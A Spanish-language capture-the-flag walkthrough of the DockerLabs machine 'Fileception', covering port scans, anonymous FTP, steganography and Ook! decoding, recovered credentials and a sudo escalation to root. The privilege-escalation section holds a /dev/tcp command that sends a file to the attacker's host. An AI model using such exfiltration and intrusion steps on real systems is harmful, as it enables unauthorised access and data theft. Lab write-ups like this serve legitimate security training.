#MAQUINA #DOCKERLABS #MEDIO 
#FTP_ANON #OOK
<hr>

# RECONOCIMIENTO

Vamos a resolver **Fileception** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 08:15 CET
Initiating ARP Ping Scan at 08:15
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 08:15, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:15
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Completed SYN Stealth Scan at 08:15, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-20 08:15:25 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **21(FTP)**, **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p21,22,80 172.17.0.2                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 08:15 CET
Nmap scan report for rubikcube.dl (172.17.0.2)
Host is up (0.000017s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrw-rw-    1 ftp      ftp         75372 Apr 27  2024 hello_peter.jpg [NSE: writeable]
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 61:8f:91:89:a7:0b:8e:17:b7:dd:38:e0:00:04:59:47 (ECDSA)
|_  256 8a:15:29:13:ec:aa:f6:20:ca:c8:80:14:56:05:ec:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 08:16 CET
Nmap scan report for rubikcube.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds

                                                            


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:**   **ftp-anon**.

## HTTP (80)

Al hacer CTRL + U :
```bash
<!-- 
¡Hola, Peter!
¿Te acuerdas los libros que te presté de esteganografía? ¿A que estaban buenísimos?
Aquí te dejo una clave que usaras sabiamente en el momento justo. Por favor, no seas tan obvio, la vida no se trata de fuerza bruta.
@UX=h?T9oMA7]7hA7]:YE+*g/GAhM4
Solo te comento, recuerdo que usé este método porque casi nadie lo usa... o si. Lamentablemente, a mi también se me olvido. Solo recuerdo que era base
-->
```

Contra -> **base_85_decoded_password**

## FTP (21)

Al entrar con usuario anonymous, vemos una foto, utilizamos la contra :

```bash
steghide extract -sf hello_peter.jpg
Enter passphrase: 
wrote extracted data to "you_find_me.txt".

cat you_find_me.txt 
Hola, Peter!

Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook! Ook?  Ook. Ook?  Ook. Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook? Ook.  Ook? Ook.  Ook? Ook.  Ook? Ook.  Ook! Ook!  Ook? Ook!  Ook. Ook?  Ook. Ook?  Ook. Ook?  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook.  Ook. Ook?  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook! Ook.  Ook? Ook.  Ook! Ook!  Ook! Ook.  Ook! Ook.  Ook. Ook.  Ook! Ook.  Ook. Ook?  Ook! Ook.  Ook? Ook.  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook!  Ook! Ook.  Ook. Ook.  Ook! Ook.  Ook. Ook?  Ook! Ook.  Ook! Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook. Ook.  Ook! Ook.  Ook! Ook.  Ook? Ook.  Ook! Ook!  Ook! Ook.  Ook. Ook.  Ook! Ook.
```

[Descifrar y probar código Ook!](https://www.cachesleuth.com/bfook.html)
Contra Peter ssh -> **9h889h23hhss2**

YA ESTAMOS COMO PETER.
# ESCALADA PRIVILEGIOS

Vemos lo siguiente:

```bash
peter@6cdc741bd646:~$ ls -la
total 16
drwxr-xr-x 1 root root 4096 Apr 27  2024 .
drwxr-xr-x 1 root root 4096 Apr 27  2024 ..
dr-xr-xr-x 1 ftp  ftp  4096 Apr 27  2024 files
-rw-r--r-- 1 root root   60 Apr 27  2024 nota_importante.txt
peter@6cdc741bd646:~$ cat nota_importante.txt 
NO REINICIES EL SISTEMA!!

HAY UN ARCHIVO IMPORTANTE EN TMP

peter@6cdc741bd646:/tmp$ ls -la
total 28
drwxrwxrwt 1 root   root    4096 Mar 20 08:12 .
drwxr-xr-x 1 root   root    4096 Mar 20 08:12 ..
-rw-r--r-- 1 ubuntu ubuntu 14558 Apr 27  2024 importante_octopus.odt
-rw-r--r-- 1 root   root     114 Apr 27  2024 recuerdos_del_sysadmin.txt
peter@6cdc741bd646:/tmp$ cat recuerdos_del_sysadmin.txt 
Cuando era niño recuerdo que, a los videos, para pasarlos de flv a mp4, solo cambiaba la extensión. Que iluso.

```

Nos pasamos el archivo y probamos extensiones para ver como se comporta:

```bash
peter@6cdc741bd646:/tmp$ cat importante_octopus.odt > /dev/tcp/172.17.0.1/443

mv prueba.odt prueba.zip 
```

Tenemos varios archivos, nos interesa el **leerme**:
```bash
Decirle a Peter que me pase el odt de mis anécdotas, en caso de que se me olviden mis credenciales de administrador... Él no sabe de Esteganografía, nunca sé lo imaginaria esto.
usuario: octopus
password: ODBoMjM4MGgzNHVvdW8zaDQ=
```

La contra esta se encuentra en **base64**

YA ESTAMOS COMO OCTOPUS.

Vamos a ver si tenemos permisos SUDO:

```bash
octopus@6cdc741bd646:/tmp$ sudo -l
Matching Defaults entries for octopus on 6cdc741bd646:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User octopus may run the following commands on 6cdc741bd646:
    (ALL) NOPASSWD: ALL
    (ALL : ALL) ALL


```

Vemos todo con permisos SUDO :
```bash
octopus@6cdc741bd646:/tmp$ sudo bash -p
[sudo] password for octopus: 
root@6cdc741bd646:/tmp# whoami
root
root@6cdc741bd646:/tmp# 

```

**YA ESTAMOS COMO ROOT.**

